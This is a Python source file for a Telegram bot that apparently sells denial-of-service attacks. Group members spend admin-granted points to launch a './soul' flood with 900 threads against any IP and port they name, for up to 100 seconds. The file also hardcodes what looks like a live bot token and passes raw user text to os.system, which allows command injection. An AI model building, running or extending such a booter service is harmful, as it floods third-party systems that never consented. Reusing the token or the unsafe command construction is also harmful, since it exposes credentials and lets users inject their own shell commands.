import os
import telebot
import logging
import asyncio
from threading import Thread

TOKEN = "7905527454:AAFU6FfZUXKYzShaiUAxAo1_ZNHGHTqzjww"
ADMIN_ID = 6207079474  # Replace with your actual admin user ID

bot = telebot.TeleBot(TOKEN)

user_permissions = {}  # Dictionary to store user access status
user_points = {}  # Store points for each user
attack_in_progress = False  # Flag to check if an attack is running

# Handle attack command (IP, Port, Duration) directly in group chat
@bot.message_handler(func=lambda message: True)
def handle_attack_command(message):
    global attack_in_progress
    user_id = message.from_user.id

    if message.chat.type == 'private':
        # Ignore private messages unless you want specific functionality here.
        return

    # Check if the message format is correct (IP Port Duration)
    parts = message.text.split()
    if len(parts) != 3:
        return  # If the message format is not correct, do nothing
    
    # Ensure the user has permission (points) to start an attack
    if user_id not in user_points or user_points[user_id] <= 0:
        bot.send_message(message.chat.id, f"❗ You have no points left. Please contact the admin @samy784 to get more points.")
        return

    # Parse message data
    target_ip, target_port, duration = parts
    try:
        target_port = int(target_port)
        duration = int(duration)
    except ValueError:
        return  # If invalid port or duration, do nothing

    if attack_in_progress:
        bot.send_message(message.chat.id, "⚠️ An attack is currently in progress. Please try again later.")
        return

    # Check if IP address is valid
    if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
        bot.send_message(message.chat.id, "❗ Invalid IP address format. Please provide a valid IP.")
        return

    if duration > 100:
        bot.send_message(message.chat.id, "❗ The maximum attack duration is 100 seconds. Please provide a shorter duration.")
        return

    # Decrease user points before starting the attack
    user_points[user_id] -= 1

    # Start attack process
    attack_in_progress = True
    threads = 900  # Number of threads for attack (default value)

    bot.send_message(message.chat.id, f"🚀 Attack in progress!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")

    # Execute attack command (replace './soul' with your actual attack command)
    attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
    os.system(attack_command)

    attack_in_progress = False
    bot.send_message(message.chat.id, f"🎉 Attack completed! You now have {user_points[user_id]} points remaining.\nFor more points, please contact the admin @samy784.")

# Admin adds points to a user
@bot.message_handler(commands=['addpoint'])
def add_points(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can add points. Please contact the admin @samy784.")
        return

    try:
        target_user_id, points_to_add = map(int, message.text.split()[1:])
        if target_user_id in user_points:
            user_points[target_user_id] += points_to_add
        else:
            user_points[target_user_id] = points_to_add
        bot.send_message(target_user_id, f"🎉 You have been granted {points_to_add} points. You now have {user_points[target_user_id]} points.")
        bot.send_message(message.chat.id, f"User {target_user_id} has been granted {points_to_add} points.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid user ID and points. Example: /addpoint 123456789 10")

# Admin removes points from a user
@bot.message_handler(commands=['removepoint'])
def remove_points(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can remove points. Please contact the admin @samy784.")
        return

    try:
        target_user_id, points_to_remove = map(int, message.text.split()[1:])
        if target_user_id in user_points:
            user_points[target_user_id] -= points_to_remove
            if user_points[target_user_id] < 0:
                user_points[target_user_id] = 0  # Ensure points don't go negative
        else:
            bot.send_message(message.chat.id, f"❗ User {target_user_id} does not have any points.")
            return
        bot.send_message(target_user_id, f"❗ {points_to_remove} points have been removed from your account. You now have {user_points[target_user_id]} points.")
        bot.send_message(message.chat.id, f"User {target_user_id} has had {points_to_remove} points removed.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid user ID and points to remove. Example: /removepoint 123456789 5")

# Admin removes points from all users in the group
@bot.message_handler(commands=['removepointall'])
def remove_points_all(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can remove points from all users.")
        return

    # Reset points of all users to 0
    for user in user_permissions:
        user_points[user] = 0
        bot.send_message(user, "❗ Your points have been reset to 0. Please contact the admin @samy784 for more points.")
    
    # Confirmation message in the group
    bot.send_message(message.chat.id, "✅ Points have been reset for all users. All points are now 0.")

# Admin adds points to all users in the group
@bot.message_handler(commands=['addpointall'])
def add_points_to_all(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can add points to everyone.")
        return

    try:
        parts = message.text.split()
        
        if len(parts) != 2:  # Ensure that only 2 parts are provided (command and points)
            bot.send_message(message.chat.id, "❗ Invalid command format. Correct format: /addpointall <points>")
            return
        
        points_to_add = int(parts[1])  # Points to add to all users

        # Iterate over all users in user_permissions and add points
        for user in user_permissions:
            if user in user_points:
                user_points[user] += points_to_add
            else:
                user_points[user] = points_to_add
            bot.send_message(user, f"🎉 You have been granted {points_to_add} points. You now have {user_points[user]} points.")
        
        # Confirmation message in the group
        bot.send_message(message.chat.id, f"✅ {points_to_add} points have been added to all group members. Everyone can now use their points.")

    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid number of points.\nExample: /addpointall 10")

# Admin checks all users' points
@bot.message_handler(commands=['checkallpoints'])
def check_all_points(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can check all users' points.")
        return

    if not user_points:
        bot.send_message(message.chat.id, "❗ No users have points assigned yet.")
        return

    points_report = "📊 Points of all users:\n"
    for user_id, points in user_points.items():
        user = bot.get_chat(user_id)
        points_report += f"👤 {user.first_name} (ID: {user_id}): {points} points\n"

    bot.send_message(message.chat.id, points_report)

# Automatic reminder every 10 minutes (Fixed with async/await)
async def send_10_minute_reminder():
    while True:
        await asyncio.sleep(600)  # Wait for 10 minutes (600 seconds)
        for user_id in user_permissions:
            bot.send_message(user_id, "📢 **Reminder:** If you want more points, join our channel, provide feedback, and add as many people as you can to the channel.\n👉 Join the channel: [https://t.me/l4dwale]\n⚠️ Once you’ve done that, contact the admin @samy784 to get more points.")

# Run the bot
def start_asyncio_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(send_10_minute_reminder())  # Create the task for sending reminders
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()
